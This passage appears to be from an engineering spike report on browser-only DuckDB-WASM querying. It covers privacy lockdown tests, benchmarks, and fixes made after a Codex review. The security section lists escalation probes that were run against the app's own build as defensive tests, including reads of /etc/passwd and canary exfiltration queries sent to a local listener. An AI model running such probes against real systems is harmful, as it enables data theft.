Extension binaries are fetched at build time and checked against SHA-256 hashes in `extensions.lock.json`. At runtime `allowUnsignedExtensions = false`, but **runtime signature checking by the engine was not independently verified.**

**Results (Chrome, automated test `lockdown blocks every …`):**
- **19 of 21 escalation probes fail with an engine error:**
  - remote `read_csv`, `read_parquet`, `read_json`, `read_text`, `read_blob` and `glob`;
  - `FROM 'http://…'`, `ATTACH`, `COPY TO` and `EXPORT DATABASE` to a URL;
  - `LOAD httpfs` and `LOAD <url>`;
  - re-enabling external access or auto-load, changing the extension repository, widening `allowed_directories`, unlocking or resetting the lock;
  - reading `/etc/passwd`.
- **2 probes return without error: `INSTALL httpfs` and `INSTALL <url>`.** They made no network request and loaded nothing (asserted: the loaded extensions are exactly `core_functions`, `json`, `parquet`). In the WASM build, `INSTALL` appears to defer fetching to `LOAD`, which is blocked. This deviates from the proposed criterion that *every* escalation errors. Recorded, not hidden.
- With a canary string planted in a registered CSV, exfiltration attempts such as `read_csv('<listener>/x?d=' || secret)` and `COPY … TO '<listener>'` failed. The local listener received **0 requests**, and **no request** from the page or worker left the app origin or contained the canary.
- **Negative control** (lockdown off): the listener received requests. This proves the capture method sees worker traffic.
- User files registered as browser `File` handles under `/qv-local/` remain readable with external access disabled.

**Not covered:** other browsers; DuckDB functions not in the probe list; denial-of-service through expensive SQL (handled by cancel and timeouts, §9.5); the threat of a malicious *app* build (supply chain).

### 9.5 E4: cancellation and recovery

- Queries always use the streaming API (`conn.send`). **All 160 benchmark cancellations were cooperative** (`cancelSent`); the worker never had to be terminated. (A further 14 cancel-workload runs finished before the cancel fired and are not counted.) Stop time (cancel request to query settled), across all sizes and formats:
  - CPU-bound join: **≤ 102 ms**;
  - during a blocking full sort: **≤ 264 ms**.
  - In every case a follow-up query succeeded.
- Some sorts finished before the cancel fired (Parquet 50 MB, imported CSV 50 MB). Those runs are labelled as such in §9.6 and are not counted as cancellations.
- **Leak check, 20 cycles × 2 workloads (50 MB CSV):**
  - engine memory after each cycle: 0 bytes;
  - main-thread JS heap: 5.0–10.8 MB, with no upward trend;
  - renderer RSS peak: 381 MB at cycle 1, 363 MB at cycle 20.
  - **No leak observed** within 20 cycles.
- **Forced termination path** (automated test): restarting the worker mid-query drops the stale result (`cancelled`/`stale`), re-applies the lockdown and re-attaches files in both view and table modes.
  - Re-attach cost at scale was **not measured on the restart path**. It should equal the registration cost: about 0.1 s for a file view, and up to 9.1 s for re-importing a 1 GB CSV table (§9.6). That figure is an inference.
- **Not measured:** the time from clicking Cancel to the UI acknowledging it. The cancel API returned in milliseconds, but a separate UI-acknowledgement timing was not instrumented.

### 9.6 E6/E8/E3: workloads at 50 MB → 1 GB (Chrome)

Smallest sizes first; each step only after the previous one completed. Two attach modes:
- **file view:** `CREATE VIEW … AS SELECT * FROM read_*(file)`; the file is re-read by every query;
- **imported table:** `CREATE TABLE … AS SELECT …`; the data is held in the engine's memory.

**50MB**: 683,058 orders rows. On disk: orders.csv 50 MB, orders.parquet 21 MB, orders.ndjson 112 MB; customers.csv 1.2 MB (26,839 rows).

| Workload (median of 3) | CSV file view | PARQUET file view | JSON file view | CSV imported table |
|---|---:|---:|---:|---:|
| Register orders file | 129 ms | 15 ms | 119 ms | 417 ms |
| schema_orders | 68 ms | 2 ms | 81 ms | 1 ms |
| preview_100 | 65 ms | 34 ms | 116 ms | 2 ms |
| count_orders | 182 ms | 1 ms | 272 ms | 1 ms |
| filter_count | 180 ms | 6 ms | 334 ms | 13 ms |
| aggregate_by_region | 204 ms | 23 ms | 351 ms | 15 ms |
| sort_topn_100 | 194 ms | 34 ms | 336 ms | 15 ms |
| sort_full_first_100 | 371 ms | 250 ms | 538 ms | 126 ms |
| equi_join_count_sum | 229 ms | 37 ms | 404 ms | 14 ms |
| fanout_key_multiplicity | 30 ms | 3 ms | 29 ms | 3 ms |
| fanout_left_join_rows | 227 ms | 20 ms | 327 ms | 11 ms |
| rowloss_unmatched_orders | 218 ms | 15 ms | 335 ms | 9 ms |
| cancel_heavy_join | cooperative, stop ≤ 102 ms (20/20) | cooperative, stop ≤ 10 ms (5/5) | cooperative, stop ≤ 101 ms (5/5) | cooperative, stop ≤ 12 ms (5/5) |
| cancel_during_full_sort | cooperative, stop ≤ 149 ms (20/20) | finished before cancel fired (235 ms) | cooperative, stop ≤ 71 ms (5/5) | finished before cancel fired (124 ms) |
| All answers match known values | yes | yes | yes | yes |
| Max frame gap (any workload) | 17 ms | 17 ms | 17 ms | 17 ms |
| Peak OS RSS: Chrome tree / renderer | 1047 / 613 MB | 1117 / 630 MB | 1185 / 710 MB | 1043 / 575 MB |

**200MB**: 2,690,778 orders rows. On disk: orders.csv 200 MB, orders.parquet 88 MB, orders.ndjson 445 MB; customers.csv 4.9 MB (107,367 rows).

| Workload (median of 3) | CSV file view | PARQUET file view | JSON file view | CSV imported table |
|---|---:|---:|---:|---:|
| Register orders file | 110 ms | 27 ms | 113 ms | 1.35 s |
| schema_orders | 74 ms | 2 ms | 90 ms | 1 ms |
| preview_100 | 58 ms | 22 ms | 107 ms | 3 ms |
| count_orders | 576 ms | 2 ms | 760 ms | 1 ms |
| filter_count | 558 ms | 20 ms | 975 ms | 40 ms |
| aggregate_by_region | 638 ms | 88 ms | 1.10 s | 56 ms |
| sort_topn_100 | 618 ms | 138 ms | 1.09 s | 23 ms |
| sort_full_first_100 | 1.49 s | 1.09 s | 1.97 s | 513 ms |
| equi_join_count_sum | 687 ms | 154 ms | 1.15 s | 52 ms |
| fanout_key_multiplicity | 41 ms | 6 ms | 44 ms | 4 ms |
| fanout_left_join_rows | 626 ms | 80 ms | 1.04 s | 40 ms |
| rowloss_unmatched_orders | 622 ms | 61 ms | 1.03 s | 30 ms |
| cancel_heavy_join | cooperative, stop ≤ 91 ms (5/5) | cooperative, stop ≤ 14 ms (5/5) | cooperative, stop ≤ 40 ms (5/5) | cooperative, stop ≤ 14 ms (5/5) |
| cancel_during_full_sort | cooperative, stop ≤ 71 ms (5/5) | cooperative, stop ≤ 83 ms (5/5) | cooperative, stop ≤ 86 ms (5/5) | cooperative, stop ≤ 264 ms (5/5) |
| All answers match known values | yes | yes | yes | yes |
| Max frame gap (any workload) | 17 ms | 17 ms | 17 ms | 17 ms |
| Peak OS RSS: Chrome tree / renderer | 1200 / 752 MB | 1240 / 758 MB | 1290 / 865 MB | 1375 / 890 MB |

**500MB**: 6,649,369 orders rows. On disk: orders.csv 500 MB, orders.parquet 229 MB; customers.csv 12.7 MB (268,419 rows).

| Workload (median of 3) | CSV file view | PARQUET file view | CSV imported table |
|---|---:|---:|---:|
| Register orders file | 112 ms | 21 ms | 3.49 s |
| schema_orders | 62 ms | 3 ms | 1 ms |
| preview_100 | 69 ms | 23 ms | 5 ms |
| count_orders | 1.42 s | 2 ms | 2 ms |
| filter_count | 1.36 s | 47 ms | 93 ms |
| aggregate_by_region | 1.50 s | 210 ms | 132 ms |
| sort_topn_100 | 1.45 s | 302 ms | 46 ms |
| sort_full_first_100 | 3.88 s | 2.90 s | 1.32 s |
| equi_join_count_sum | 1.66 s | 435 ms | 132 ms |
| fanout_key_multiplicity | 66 ms | 14 ms | 9 ms |
| fanout_left_join_rows | 1.55 s | 224 ms | 100 ms |
| rowloss_unmatched_orders | 1.51 s | 191 ms | 74 ms |
| cancel_heavy_join | cooperative, stop ≤ 98 ms (5/5) | cooperative, stop ≤ 18 ms (5/5) | cooperative, stop ≤ 17 ms (5/5) |
| cancel_during_full_sort | cooperative, stop ≤ 61 ms (5/5) | cooperative, stop ≤ 72 ms (5/5) | cooperative, stop ≤ 58 ms (5/5) |
| All answers match known values | yes | yes | yes |
| Max frame gap (any workload) | 17 ms | 17 ms | 17 ms |
| Peak OS RSS: Chrome tree / renderer | 1382 / 1141 MB | 1422 / 935 MB | 1515 / 1085 MB |

**1GB**: 13,205,164 orders rows. On disk: orders.csv 1000 MB, orders.parquet 461 MB; customers.csv 25.5 MB (536,839 rows).

| Workload (median of 3) | CSV file view | PARQUET file view | CSV imported table |
|---|---:|---:|---:|
| Register orders file | 135 ms | 32 ms | 9.08 s |
| schema_orders | 86 ms | 6 ms | 1 ms |
| preview_100 | 75 ms | 36 ms | 9 ms |
| count_orders | 3.47 s | 6 ms | 4 ms |
| filter_count | 3.72 s | 121 ms | 264 ms |
| aggregate_by_region | 4.51 s | 570 ms | 360 ms |
| sort_topn_100 | 4.53 s | 744 ms | 113 ms |
| sort_full_first_100 | 11.80 s | 8.31 s | 3.95 s |
| equi_join_count_sum | 5.27 s | 1.17 s | 413 ms |
| fanout_key_multiplicity | 162 ms | 48 ms | 28 ms |
| fanout_left_join_rows | 4.80 s | 691 ms | 346 ms |
| rowloss_unmatched_orders | 4.59 s | 601 ms | 270 ms |
| cancel_heavy_join | cooperative, stop ≤ 88 ms (5/5) | cooperative, stop ≤ 28 ms (5/5) | cooperative, stop ≤ 49 ms (5/5) |
| cancel_during_full_sort | cooperative, stop ≤ 126 ms (5/5) | cooperative, stop ≤ 87 ms (5/5) | cooperative, stop ≤ 63 ms (5/5) |
| All answers match known values | yes | yes | yes |
| Max frame gap (any workload) | 33 ms | 17 ms | 17 ms |
| Peak OS RSS: Chrome tree / renderer | 1328 / 1148 MB | 1846 / 1354 MB | 1797 / 1407 MB |

**Workload definitions** (`src/bench/runner.ts`):
- `count_orders` uses Parquet metadata for Parquet files, which explains the near-zero times.
- `sort_full_first_100` sorts every row (`ORDER BY note DESC, order_id`) and keeps only the first 100 rows.
- `sort_topn_100` uses `LIMIT 100` (a top-N sort).
- The join is `orders ⋈ customers` on `customer_id`, where customers is the small side.
- The three fan-out/row-loss queries are checked against the generator's exact counts.

**Correctness:** *[Corrected: §10.5]* the 19 benchmark runs (14 main runs, 1 smoke run, 4 stress/boundary runs) contain 703 workload records, of which **517 are answer-check assertions** (all 517 passed). The other 186 are 160 exercised cancellations, 14 cancel workloads that finished before the cancel fired, 9 stress workloads without answer checks and 3 expected out-of-memory errors. The earlier wording that every one of 703 records was a passing correctness check was wrong. This covers row counts, filtered counts, per-region counts, exact cent totals, inner and left join row counts, duplicated keys, excess rows and unmatched rows. **This is not E3.** The research's known-answer corpus (composite keys, NULL keys, empty relations, type mismatches, net-zero cases) was **NOT RUN**.

**Responsiveness:**
- Across all 703 workload records, Chrome reported **0 long tasks** (main-thread blocks > 50 ms).
- The worst frame gap was **33 ms** (1 GB CSV view), with 17 ms (one frame at 60 Hz) everywhere else. *[Corrected: §10.6]* **84 of the 703 records have no frame-gap sample** (the workload ended before the first animation frame); the frame-gap figures cover the other 619 only. All runs were headless and exercised bounded benchmark probes; they do not establish visible-window interaction latency.
- Headless Chrome was used. Frame-gap results should be repeated in a visible window and on other browsers.

**Bounded results:** the automated test confirms that a 2,000,000-row result delivers exactly 1,000 rows to the UI, is flagged as truncated, and leaves the engine free for the next query. Rendering 10,000 rows (E8) was **NOT RUN**.

### 9.7 Boundary characterisation

Opt-in stress workloads, all run under the safety rules: grouping by every row; self-join of orders on `customer_id`; `count(DISTINCT note)`.

| Run | Result |
|---|---|
| 200 MB Parquet view, memory_limit 2 GB | All completed: 0.25 s / 1.16 s / 0.46 s. Peak RSS 1,184 / 637 MB |
| 1 GB Parquet view, memory_limit 2 GB | All completed: 1.57 s / 6.54 s / 2.41 s. Peak RSS 1,570 / 1,103 MB |
| 1 GB CSV imported table, memory_limit 2 GB | All completed: 1.25 s / 6.46 s / 1.63 s. Peak RSS 1,906 / 1,490 MB (the highest of the spike) |
| 1 GB Parquet view, **memory_limit 256 MB** | All three failed with **`Out of Memory Error`** within 0.55–0.83 s. Engine memory returned to 0 and later queries kept working. **The failure was a recoverable error, not a crash.** |

**What this shows:** with a DuckDB memory limit set below the browser's practical limit, overload has so far surfaced as a recoverable engine error. Engine temporary storage stayed at 0: no disk spilling was configured (OPFS spill, E10, not run).

**Deliberately not run (safety):** removing or raising the memory limit to push the WASM heap towards its 4 GB ceiling. On this 8 GB machine with more than 5 GB of swap already in use, that risks a renderer crash or a system stall. **The behaviour at the true browser ceiling (crash vs error) is therefore unknown.** Also not run: large-to-large joins with large outputs, wide tables (~50 columns), skewed keys.

### 9.8 E11: licences (partial)

- All production npm packages installed for the spike are MIT, Apache-2.0 (`apache-arrow`, `flatbuffers`, `@swc/helpers`), BSD-3-Clause (`qs`) or 0BSD (`tslib`). These are compatible with either MIT or Apache-2.0 as the project licence.
- **Gap:** the installed `@duckdb/duckdb-wasm` package contains **no LICENSE or third-party notice file** (its `package.json` declares MIT). The `.wasm` binaries and the `parquet`/`json` extensions compile in third-party code whose notices have not been collected. This must be resolved from DuckDB's source repository at the pinned version before any public deployment.

### 9.9 Not run in this spike

| Item | Status | Reason |
|---|---|---|
| Safari | NOT RUN | Cannot be automated without enabling Safari remote automation (a maintainer setting). The manual benchmark panel exists |
| Firefox | NOT RUN | Not installed on the machine |
| Real GitHub Pages deployment | NOT RUN | Needs separate approval (§6.0). Local subpath emulation only |
| E3 known-answer corpus | NOT RUN | Out of this spike's scope |
| E5 query parsing | NOT RUN | Only checked that `json_serialize_sql` works under lockdown (automated test) |
| E9 editor, E10 OPFS | NOT RUN | Deferred by plan |
| JSON at 500 MB / 1 GB | NOT RUN | Per plan (JSON limited to 50/200 MB) |
| Memory-ceiling crash test | NOT RUN | Safety (§9.7) |
| Cancel UI-acknowledgement timing, restart-path re-attach at scale | NOT MEASURED | §9.5 |
| Visible-window (non-headless) runs | NOT RUN | Benchmarks used headless Chrome |

### 9.10 Against the proposed acceptance criteria (§6)

| Criterion | Result |
|---|---|
| E1: boots without isolation; no requests outside the origin | **Met in Chrome.** Other browsers not tested |
| E2: zero external requests, zero canary leaks, registration works under the lock | **Met in Chrome** *[Corrected: §10.1 — this build's startup was fail-open (Codex finding 1); the result is superseded by the fail-closed build's tests in §10]* |
| E2: every escalation statement errors | **Partly met**: 19/21 error; 2 `INSTALL` statements return without effect (§9.4) |
| E2: CSV/Parquet without a runtime third-party fetch | **Met** (self-hosted, hash-checked at build time) |
| E4: work stops within 2 s; follow-up query succeeds | **Met in Chrome** (≤ 264 ms, all cooperative) |
| E4: memory after 20 cycles ≤ 110 % of cycle 1 | **Met** (Chrome, 50 MB CSV) |
| E4: UI acknowledges Cancel ≤ 200 ms | **Not measured separately** |
| E6: 50 MB passes with no crash in all three browsers | **Met in Chrome only** |
| E8: no main-thread long task > 200 ms while streaming bounded results | **Met in Chrome** (0 long tasks > 50 ms) *[Corrected: §10.2/§10.6 — headless only; the byte budget was checked after conversion (Codex finding 2); rendering not tested]* |

### 9.11 Conclusions and recommendations

1. **Browser-only SQL over local files is technically feasible on the reference machine in Chrome.** CSV, Parquet and NDJSON files up to 1 GB (CSV size) were queried correctly, with the UI staying responsive and cancellation working. This is evidence for the tested workloads, browser and machine state only. It is **not a support claim.** *[Corrected: §10.6 — these are headless, warm-cache observations of bounded probes with a small dimension-side join; they do not establish a 1 GB capability or visible-window responsiveness. The proposed initial qualification target is 50 MB combined, desktop Chrome, file-backed CSV/Parquet.]*
2. **Privacy needs explicit engineering. "Runs in the browser" is not enough.** DuckDB-WASM's defaults fetch extensions from a third party, and a meta CSP does not stop the worker. The lockdown in this spike works in Chrome and should become a hard requirement of P-003/P-013, with its probe tests kept as a regression suite.
3. **Prefer file-backed views as the default.** Registration is near-instant, the data is read from the `File` on demand and survives a worker restart cheaply, and peak RSS was equal or lower than with imported tables. Importing into a table made repeated queries about 3× (full sort) to 40× (top-N) faster, mostly 11–25×. But it cost 0.4–9.1 s up front, is lost on restart, and peak RSS was equal (50 MB) or higher (200 MB–1 GB). Offer it as an explicit choice.
4. **Parquet is the strongest format.** CSV file-view queries at 1 GB took 3.5–5.3 s each (11.8 s for a full sort) because the file is re-parsed every time.
5. **Before P-003 can be confirmed:** run Safari and Firefox; do a real GitHub Pages deployment (MIME, compression, caching); collect DuckDB's third-party notices; decide how to handle the `INSTALL` no-op; and characterise the memory ceiling on a machine where a crash is acceptable.

## 10. Codex review resolution (Step 3.6, 2026-11-25)

Codex reviewed the spike and returned **CONDITIONAL GO**, with four high-severity and three medium-severity findings. All seven were reproduced on the unmodified build before any change, then corrected and covered by regression tests. Everything here is spike evidence in **desktop Chrome 158 only**. None of it is a confirmed production decision.

### 10.1 Finding 1: fail-open startup and a production lockdown bypass (HIGH) — RESOLVED

- **Reproduced:**
  - With `SET lock_configuration = true` made to fail (by wrapping the connection's `query` at runtime), `start()` still resolved and reported `lockdown: true`.
  - `lock_configuration` read `false`, and `SET autoload_known_extensions = true` succeeded.
  - The production bundle contained the `?lockdown=off` switch.
- **Root cause:** lockdown errors were collected into an array and startup continued. The effective state was never verified. The negative-control switch lived in the production entry point.
- **Correction:**
  - `bootEngine()` treats any failed lockdown statement as fatal.
  - It then verifies the **effective** state independently of the statements that ran (`verifyLockdown`):
    - ten settings read from `duckdb_settings()`, including `allow_unsigned_extensions` and `allowed_paths`;
    - the exact set of loaded extensions;
    - an active check that the lock rejects a configuration change.
  - On any failure the candidate worker is terminated and `start()` rejects (`LockdownError`, state `failed`). Until a verified engine exists, no SQL runs and no file is accepted. The UI keeps the file input and the Run button disabled.
  - Recovery uses the same path.
  - The bypass is removed from the app. The unlocked negative-control engine and fault injection exist only in a separate test build (`harness/`, `vite.harness.config.ts` → `dist-harness/`).
- **Evidence (automated):**
  - Seven injected faults (failed lock, omitted lock, omitted external-access switch, omitted autoload switch, omitted `allowed_directories`, missing `json` extension, failed repository setting) each make `start()` reject with state `failed`. SQL and registration are refused, and the worker count returns to baseline.
  - Recovery re-verifies the lockdown. A fault injected only into the recovery boot leaves the session `failed`, not usable.
  - The production `dist/` contains none of the harness markers. The same scan finds them in `dist-harness/`, which shows the scan works.
  - `?lockdown=off` on the production build has no effect.
- **Remaining:** the fault-injection *option* (`lockdownPlan`) exists in the production class. It can only make startup fail, because verification doesn't depend on it, and the production app never sets it.

### 10.2 Finding 2: result byte budget checked after conversion (HIGH) — PARTLY RESOLVED

- **Reproduced:** a one-row `repeat('x', 2 MiB)` under a 1 KiB budget returned the full 2,097,152-character string, converted on the main thread.
- **Root cause:** cells were converted with `vector.get()` (which decodes the whole value), and the byte budget was checked afterwards.
- **Correction (`bounded.ts`, `format.ts`):** separate budgets for rows, columns (200), characters per cell (500), total display characters (2,000,000) and Arrow bytes accepted (16 MiB), all applied before conversion:
  - Strings and binaries are measured from Arrow offsets, and only a bounded prefix is decoded.
  - Lists and maps are measured from offsets, and only their first items are formatted.
  - Structs are formatted field by field within the cell budget.
  - Each kind of truncation is reported separately: `rows`, `arrowBytes`, `displayChars`, `columns`, and the number of shortened cells.
- **Evidence:** 11 unit tests and 7 browser tests on real DuckDB results:
  - the 2 MiB repro;
  - eight cells of 300 KB;
  - 400-column rows;
  - display-budget truncation without row truncation;
  - a 200,000-item list, a struct holding a 1 MB string, a 5,000-entry map, and a list of large strings.
- **What the application cannot bound (engine-level limitation):** DuckDB-WASM produces result batches of up to **2,048 rows** (observed), and no setting bounds a batch's size in bytes. Each batch is built in the worker and posted to the page whole before any application check runs. One batch with huge cells is therefore fully allocated in the worker, during the transfer, and as an Arrow buffer on the page. The application stops requesting further batches and avoids decoding them, but **no hard memory guarantee is claimed.** Engine working memory is governed by DuckDB's `memory_limit`.

### 10.3 Finding 3: incomplete session lifecycle (HIGH) — RESOLVED for the prototype

- **Reproduced:**
  - During a table import, `busy` was `false` and `cancel()` returned `none`.
  - A session disposed during `start()` could still run `SELECT 1`.
  - From the source: a rejected `cancelSent()` skipped the termination fallback, and a failed relation creation was never rolled back.
- **Root cause:** there was no single owner of the session state. Imports used the blocking `query()` and were not tracked. `dispose()` couldn't reach a pending startup.
- **Correction (`session.ts`):** an explicit state machine (`idle → starting → ready ⇄ busy → cancelling → recovering → ready | failed`, plus a terminal `disposed`) and one FIFO operation queue.
  - Imports run through the streaming API and can be cancelled.
  - A rejected, timed-out or ineffective cancel terminates the worker and recovers, within `cancelDeadlineMs` plus the recovery time.
  - Every startup step races a disposal signal, so `dispose()` wins.
  - **Found during this fix:** without that race, a worker terminated mid-`instantiate()` never answers, so `start()` hung forever. The first version of the regression test caught it, with all four disposal timings timing out.
  - Failed registrations roll back the registered file and metadata.
  - Recovery re-attaches file-backed views and marks imported tables `needs-reimport`, with an explicit `reimport()`.
- **Evidence (automated):**
  - Disposal at 0, 20, 100 and 300 ms into startup: start rejects, nothing is usable, and the worker count returns to baseline.
  - Disposal during a query with another queued: both are rejected and the worker is terminated.
  - A 3 M-row CSV import is `busy` and cancellable: cooperative, 155 ms, and the cancelled import leaves no table and no dataset entry.
  - A rejected `cancelSent()` leads to termination and recovery to a working engine (generation 2).
  - A `cancelSent()` that never answers times out after 400 ms, then termination and recovery.
  - A cooperative cancel keeps generation 1.
  - Recovery restores views; a table is marked `needs-reimport` and is not queryable until re-imported, after which it is.
  - A corrupt Parquet file, in view and table mode, leaves no registered file and no relation.
  - 8 concurrent queries each return their own result.
- **Remaining:** short non-streamed phases (`registerFileHandle`, `CREATE VIEW`) can't be cancelled cooperatively. `cancel()` waits up to the deadline, then terminates. Re-attach cost at scale on the restart path was not measured.

### 10.4 Finding 4: concurrent registration collisions (HIGH) — RESOLVED

- **Reproduced:** two concurrent `same.csv` registrations (values 11 and 22) were both named `same`. Querying the first returned 22. Removing the first dropped the relation while the second stayed listed, and then failed with "Table with name same does not exist".
- **Root cause:** each name was chosen before an asynchronous step, without serialization, and `CREATE OR REPLACE` let the second registration silently replace the first.
- **Correction:**
  - Registration runs inside the serialized queue.
  - The relation name is reserved against registered datasets **and** the engine catalog, so a user-created table is never replaced.
  - `CREATE` replaces `CREATE OR REPLACE`.
  - Removal works by dataset ID and drops only that dataset's own relation.
- **Evidence (automated):**
  - The repro gives `same` = 11 and `same_2` = 22. Each can be removed independently; the other stays queryable until it is removed.
  - The same result holds through the real file input.
  - A user table `mine` survives registering `mine.csv`, which becomes `mine_2`.
  - Removing one dataset while two more `x.csv` files register gives a consistent catalog and listing.

### 10.5 Finding 5: benchmark completion mistaken for success (MEDIUM) — RESOLVED for new runs; historical runs reclassified

- **Reproduced:**
  - All 19 historical runs are labelled `completed`, and the CLI exited 0 on completion.
  - The summariser could show "all answers correct" without checking that every planned workload ran.
  - Inputs were not hashed, and no source revision was recorded.
  - My earlier reports said the 703 workload records were all correctness checks. **That was wrong.**
- **Correction:**
  - Each record now carries a `verdict`: `pass`, `fail`, `cancel-exercised`, `cancel-not-exercised`, `cancel-recovery-failed`, `stress-completed`, `expected-boundary-error`, `unexpected-error` or `aborted-timeout`.
  - Runs record the list of planned workloads.
  - `scripts/lib/acceptance.mjs` separates **harness completion** from **acceptance**. A run is `accepted` only if:
    - the harness completed;
    - the inputs were validated;
    - provenance was recorded;
    - nothing is missing;
    - there are no failed assertions, unexpected errors, timeouts or recovery failures;
    - every cancel workload exercised a cancellation.
  - Boundary errors are accepted only in runs declared with `--expect-boundary-errors`.
  - The CLI SHA-256-checks the selected inputs against the manifest and records provenance: git HEAD, branch, dirty status, and hashes of the lock files, runner, generator and every `dist/` file. It **exits non-zero unless the run is accepted.**
  - 8 unit tests cover the acceptance rules.
- **Historical reconciliation.** These are the original records; the verdicts are derived, and the measurements are unchanged:

| Category (19 historical runs) | Records |
|---|---:|
| Workload records | 703 |
| Answer-check assertions (all passed) | 517 |
| Cancellations exercised (follow-up query OK) | 160 |
| Cancel workloads that finished before the cancel fired | 14 |
| Stress workloads completed (no answer check) | 9 |
| Expected boundary failures (OOM at memory_limit 256 MB) | 3 |
| Unexpected errors / timeouts | 0 / 0 |
| Records without a frame-gap sample | 84 |

- All 19 historical runs are classified **`historical-unvalidated`**: no input hashes, no source revision, derived verdicts. Three of them (tiny CSV; 50 MB Parquet view; 50 MB CSV table) **never exercised one of their cancel workloads**, so even with full provenance they would have been rejected.

### 10.6 Finding 6: conclusions beyond the measured coverage (MEDIUM) — RESOLVED in the documentation

- **Valid.**
  - 84 historical records have no frame-gap sample.
  - All runs were headless.
  - The workloads were bounded probes with a small dimension-side join. Large-to-large joins, wide tables and skew were not covered.
  - The planned 10,000-row rendering test did not run.
  - Recovery at scale was not measured.
  - NDJSON peaked at 444.6 MB on disk (449.5 MB with its customers CSV), from the "200 MB" tier.
- **Physical input per historical tier** (orders + customers files actually selected):

| Tier label | CSV (view or table) | Parquet | NDJSON + customers CSV |
|---|---:|---:|---:|
| 50 MB | 51.2 MB | 21.7 MB | 113.3 MB |
| 200 MB | 204.9 MB | 90.0 MB | 449.5 MB |
| 500 MB | 512.7 MB | 232.4 MB | not run |
| 1 GB | 1,025.5 MB | 467.8 MB | not run |

- **Qualification boundary:**
  - The historical 50 MB–1 GB measurements stay as recorded observations: headless, warm OS cache, Chrome only, bounded probes. **They do not establish general 1 GB support.**
  - **Proposed initial qualification target, not an established limit:** desktop Chrome; file-backed CSV and Parquet up to **50 MB combined** physical input; a small dimension-side equi-join; bounded previews and aggregates.
  - Before the target can be advertised, it must be qualified at its ceiling for skew, wide cells, cancellation, recovery and visible-window responsiveness.
  - Imported tables, larger inputs, NDJSON, and every browser other than Chrome remain experimental.

### 10.7 Finding 7: entry-point-dependent safeguards and Git protection (MEDIUM) — RESOLVED

- **Reproduced:**
  - The manual panel applied no size guard.
  - The CLI checked the size *label*, not the files.
  - `git check-ignore` showed that `data.csv`, `some/dir/export.csv`, `.npmrc`, `*.sqlite-wal`, `*.sqlite-shm` and `*.db-journal` could be staged.
- **Correction:**
  - **CLI:**
    - resolves real paths and refuses inputs outside `data/`;
    - uses actual file sizes: over 50 MB combined needs `--confirm-large`, over 250 MB also needs `--maintainer-approval "<who, when>"`;
    - hashes the inputs;
    - takes a PID lock file, so only one benchmark runs at a time.
  - **Page entry point** (shared by the manual panel and the CLI):
    - checks sizes against the manifest;
    - checks SHA-256 for inputs up to 50 MB combined (the browser has to read the whole file to hash it);
    - requires explicit confirmation above 50 MB and refuses above 1.1 GB;
    - takes a Web Locks lock across tabs and a per-tab single-run guard.
    - The browser cannot measure host memory pressure, so no host metric is shown.
  - **`.gitignore`:**
    - data files are ignored everywhere except under `fixtures/`;
    - also ignored: `.npmrc`/`.yarnrc`/`.pypirc`, `*.local.*` config files, every SQLite/DuckDB sidecar (`-wal`, `-shm`, `-journal`), `dist-harness/` and the bench lock file.
    - This reverses my earlier decision not to ignore `.npmrc`: none is needed, and one can be re-included deliberately after review.
- **Evidence:**
  - 4 browser tests: valid tiny inputs pass with hashes verified; a same-size tampered file is refused; an unconfirmed 51 MB input and an unlisted file are refused; a second concurrent run is refused.
  - CLI refusals observed: a 512.7 MB input without approval, a 51.2 MB input without `--confirm-large`, and a lock held by a live PID.
  - `git check-ignore` confirms the 14 risky paths are ignored and the 7 intended files (fixtures, lock files, `summary.json`, `.env.example`) stay committable.

### 10.8 New regression benchmarks (schema v2, Chrome 158, headless, reference MacBook Air)

Small and safe only. No 500 MB / 1 GB or memory-ceiling runs were repeated. The working tree was uncommitted (recorded as `workingTreeDirty: true`; git HEAD `eb877c2`).

| Run | Physical input | Harness | Acceptance | Assertions | Cancels exercised / not | Frame-gap missing | Peak RSS (tree / renderer) |
|---|---:|---|---|---:|---:|---:|---:|
| tiny CSV view | 0.2 MB | completed | **rejected** (queries finish before cancel fires) | 12/12 | 0 / 4 | 2 | — |
| 50 MB-tier Parquet view, cancel at 1,000/250 ms | 21.7 MB | completed | **rejected** (full sort finished before its cancel) | 36/36 | 5 / 5 | 13 | 1,018 / 573 MB |
| 50 MB-tier Parquet view, cancel at 400/100 ms | 21.7 MB | completed | **accepted** | 36/36 | 10 / 0 | 13 | 1,128 / 641 MB |
| 50 MB-tier CSV view (`--confirm-large`) | 51.2 MB | completed | **accepted** | 36/36 | 10 / 0 | 0 | 1,006 / 527 MB |

- Both accepted runs had inputs SHA-256-verified, every cancel cooperative, and follow-up queries OK.
- The CSV run is 1.2 MB **over** the proposed 50 MB combined ceiling. Only the Parquet run is inside it.

### 10.9 Updated acceptance matrix (spike, Chrome only)

| Criterion (§6) | Status | Evidence |
|---|---|---|
| E1: boots without isolation; only same-origin static requests | **Met (Chrome, local Pages-style server)** | `spike.spec.ts`, `security.spec.ts`. Real GitHub Pages not tested |
| E2: lockdown verified fail-closed; zero external requests and canary leaks | **Met (Chrome)** | Every request is a same-origin GET with no query string and no body, no redirects, and no canary in headers. 0 listener hits. Positive controls prove page and worker traffic are observable |
| E2: every escalation statement errors | **Partly met** | 19 of 21 error. 2 `INSTALL` statements return without effect (no request; loaded set unchanged) |
| E2: extension integrity | **Build-time only** | SHA-256 lock at vendoring. Runtime signature checking by DuckDB not independently verified |
| E4: work stops within 2 s; follow-up succeeds; import cancellable | **Met (Chrome)** | 185 exercised cancellations (160 historical, 25 in the new runs), all cooperative. Import cancel 155 ms. Rejected and timed-out cancels recover by termination |
| E4: no leak over 20 cycles | **Met (historical, 50 MB CSV)** | Not repeated on the new build |
| E4: UI acknowledges Cancel ≤ 200 ms | **Not measured separately** | — |
| E6: 50 MB-tier passes in all three browsers | **Chrome only** | Accepted v2 runs: Parquet 21.7 MB, CSV 51.2 MB |
| E8: bounded results; no long tasks | **Partly met** | Budgets enforced before conversion. Per-batch transfer is not bounded (engine). Headless only. Rendering not tested |
| Benchmark integrity | **Met for new runs** | Acceptance separate from completion; input hashes; provenance; non-zero exit |

### 10.10 Security and privacy assessment (spike)

- **Established, in Chrome 158 on the production artifact:**
  - the engine cannot start without a verified lockdown;
  - SQL escalation paths are blocked;
  - every observed request is a same-origin static GET with no data in the URL, body or headers;
  - an unlocked engine *would* reach the network, and the capture method sees it.
- **Not established:**
  - Safari and Firefox behaviour;
  - DuckDB functions outside the probe list;
  - runtime extension signature verification;
  - a real GitHub Pages origin (shared `*.github.io` storage, CDN caching, redirects);
  - a compromised build (supply chain);
